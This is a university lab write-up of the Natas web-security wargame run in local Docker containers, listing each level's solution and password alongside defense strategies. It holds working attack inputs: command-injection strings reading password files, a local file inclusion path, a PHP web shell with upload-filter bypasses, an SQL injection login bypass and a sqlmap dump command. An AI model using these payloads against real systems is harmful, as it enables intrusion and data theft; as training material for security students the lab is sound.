# Natas Wargame - Web Security Challenge Lab

**Web Application Security Vulnerability Assessment**  
*University of San Diego - Network Security Engineering*  
*Docker-based Web Security Training Environment*

## Objective

This lab introduces common web security vulnerabilities through progressive challenges. Students learn to identify and exploit vulnerabilities including HTTP authentication bypass, directory traversal, command injection, SQL injection, file upload attacks, and XSS. Each level builds upon previous knowledge to develop comprehensive web application security assessment skills.

## Prerequisites

- Basic understanding of HTTP protocol and web applications
- Familiarity with browser developer tools
- Docker and Docker Compose installed
- Command line proficiency (curl, basic scripting)
- Understanding of OSI model application layer concepts

## Lab Setup

### Step 1: Download Required Files
Download the provided lab materials:
- `natas.tar.gz` - Docker images archive
- `Student_Instructions.md.docx` - Installation guide

### Step 2: Load Docker Images
```bash
cd /path/to/natas/directory
docker load -i natas-mysql-2.tar
docker load -i natas-web-2.tar
```

### Step 3: Start Services
```bash
docker stop natas-web-1 natas-mysql-1
docker-compose -f docker-compose-new.yml up -d
```

### Step 4: Verify Access
Navigate to `http://localhost:5001` and `http://localhost:8080` to confirm services are running.

## Challenge Progression

### Level 0-1: Basic Source Code Analysis
**Initial Credentials:** `natas0:xelpUVCjxnHOUtH9g3uZNyXX3PbBkBIp`

**Solution Method:**
```bash
# Right-click page → View Page Source
# Look for HTML comments containing credentials
```

**Result:** `natas1:cx0Ug2XQ2GpP31e6m82vjF0AbjHjSJRg`

### Level 2: Developer Tools Investigation
**Technique:** Browser developer tools (F12 or Ctrl+Shift+I)

**Result:** `natas2:c3cQqNMP9kbCovsRGhsgXyzzt2uFkgqa`

### Level 3: Directory Traversal
**Method:** Analyze source for file paths, navigate to `/files` directory

**Solution:**
```bash
# Navigate to http://localhost:8080/natas2/files/
# Examine users.txt file for credentials
```

**Result:** `natas3:jvwZ87y3RYR4QGZUFgXmWlLZnxz9J1ZE`

### Level 4: Robots.txt Analysis
**Technique:** Web crawler prevention file examination

**Solution:**
```bash
# Check robots.txt file
curl http://localhost:8080/natas3/robots.txt
# Navigate to discovered /s3cr3t directory
```

**Result:** `natas4:aiAYWOl77qltSYyJkfXmajoyKCTpshYr`

### Level 5: HTTP Referer Manipulation
**Vulnerability:** Referer header validation bypass

**Solution:**
```bash
curl -u natas4:aiAYWOl77qltSYyJkfXmajoyKCTpshYr \
     -H "Referer: http://localhost:8080/natas5/" \
     http://localhost:8080/natas4/
```

**Result:** `natas5:ZQ4Z1oIOtMCyoQkVpKOLpTRGPdBvfEJ2`

### Level 6: Cookie Manipulation
**Technique:** Client-side authentication bypass

**Solution:**
```bash
# Modify cookie parameter: loggedin=0 → loggedin=1
# Use browser developer tools → Application → Cookies
```

**Result:** `natas6:JE39QTZnzjToPaQq1q1jJuphVxdObMST`

### Level 7: File Inclusion Discovery
**Method:** Source code analysis reveals include path

**Solution:**
```bash
# Navigate to http://localhost:8080/natas6/includes/secret.inc
# Extract secret: FOEIUWGHFEEUHOFUOIU
```

**Result:** `natas7:zLzx2id4WYHzyxmmceevO63UPzuyNQya`

### Level 8: Local File Inclusion (LFI)
**Vulnerability:** Direct file access via URL parameters

**Solution:**
```bash
# URL: http://localhost:8080/natas7/index.php?page=/etc/natas_webpass/natas8
```

**Result:** `natas8:3KlEdmRfcUpFcPo2sgx9XBqP8Y6xj7uK`

### Level 9: Encoding Chain Reversal
**Technique:** Multi-step decoding (hex → reverse → base64)

**Solution:**
```bash
echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
```

**Result:** `natas9:V097z4qcLPapOrHJJ7E3CDkqWzUP5mt0`

### Level 10: Command Injection
**Vulnerability:** Unfiltered user input in shell commands

**Solution:**
```bash
# Input: |cat /etc/natas_webpass/natas10
# Exploits passthru("grep -i $key dictionary.txt")
```

**Result:** `natas10:oEu2vdmkINvL5VxafnCf3smQbTYQqscj`

### Level 11: Filtered Command Injection
**Technique:** Bypass character filtering using grep functionality

**Solution:**
```bash
# Input: a /etc/natas_webpass/natas11
# Uses grep's multiple file argument feature
```

**Result:** `natas11:Pu9UWR8Ei5O0ANvSiP4idbLfaMRA7sHr`

### Level 12: Cookie Encryption/XOR Attack
**Method:** XOR key recovery and cookie tampering

**Solution Process:**
1. Extract encrypted cookie
2. Recover XOR key: `qw8J`
3. Modify data: `showpassword=yes`
4. Re-encrypt and set cookie

**Result:** `natas12:RL5C33ZfMLiRoagzonsgKnSmAzZ6Wafv`

### Level 13: File Upload - PHP Execution
**Vulnerability:** Unrestricted file upload with execution

**Solution:**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
Upload as .jpg, intercept request, change extension to .php

**Result:** `natas13:icskyy3mbCWmUZs7h72xCsD1GFGtkJgz`

### Level 14: File Upload - Magic Bytes Bypass
**Technique:** PHP polyglot with JPEG header

**Solution:**
```bash
# Prepend FF D8 FF E0 (JPEG magic bytes) to PHP payload
# Upload and access with cmd parameter
```

**Result:** `natas14:M5EFjJPoZfeUFy6StflnZPk6VuZxgsv1`

### Level 15: SQL Injection Authentication Bypass
**Vulnerability:** Unfiltered SQL query construction

**Solution:**
```sql
# Username: " OR 1=1 #
# Password: test
# Resulting query bypasses authentication
```

**Result:** `natas15:NYPI7EbUzgGVlDYqkLNGpb2bWwssSJBI`

### Level 16+: Advanced SQL Injection
**Technique:** Automated blind SQL injection

**Solution:**
```bash
sqlmap -u "http://localhost:8080/natas15/?username=*" \
       --auth-type Basic \
       --auth-cred "natas15:NYPI7EbUzgGVlDYqkLNGpb2bWwssSJBI" \
       --string="This user exists" \
       --technique=B --level=2 --risk=1 \
       --dbms=mysql -p username --dump
```

## Cleanup

### Stop Services
```bash
docker-compose -f docker-compose-new.yml down
```

### Remove Images (Optional)
```bash
docker rmi natas-web:latest natas-mysql-with-setup:latest
```

## Results and Observations

### Key Findings
* Web applications commonly suffer from input validation failures
* Client-side security controls are easily bypassed
* File upload mechanisms require strict validation and sandboxing
* SQL injection remains prevalent in database-driven applications
* Cookie-based authentication systems are vulnerable to tampering

### Technical Observations
* Command injection occurs when user input reaches shell execution functions
* Directory traversal exploits inadequate path filtering
* XOR encryption with known plaintext is cryptographically weak
* HTTP headers like Referer can be arbitrarily manipulated by attackers

## Real-World Implications

### Web Application Security
These vulnerabilities represent common attack vectors in production environments. Organizations frequently encounter similar issues in custom applications, legacy systems, and third-party integrations.

### Organizations at Risk
* E-commerce platforms with file upload functionality
* Content management systems with dynamic includes
* Web applications using basic authentication mechanisms
* Database-driven sites without parameterized queries

### Business Impact
Successful exploitation can lead to data breaches, system compromise, unauthorized access to sensitive information, and complete application takeover.

## Defense Strategies

### Technical Mitigations
* Implement strict input validation and output encoding
* Use parameterized queries for database interactions
* Apply principle of least privilege for file system access
* Employ secure session management and strong authentication
* Configure proper HTTP security headers

### Infrastructure Solutions
* Deploy Web Application Firewalls (WAF)
* Implement network segmentation
* Use automated vulnerability scanning
* Establish secure development lifecycle practices
* Regular security assessments and penetration testing

## Educational Value

This lab demonstrates:
* Progressive complexity in web vulnerability exploitation
* Practical application of OWASP Top 10 security risks
* Hands-on experience with common attack techniques
* Development of systematic security assessment methodology
* Integration of multiple tools and techniques for comprehensive testing

## Disclaimer

⚠️ **For Educational Purposes Only**

This lab is designed exclusively for educational use within the University of San Diego Network Security Engineering course. All techniques demonstrated should only be applied in authorized testing environments. Unauthorized use of these methods against systems without explicit permission is illegal and unethical.
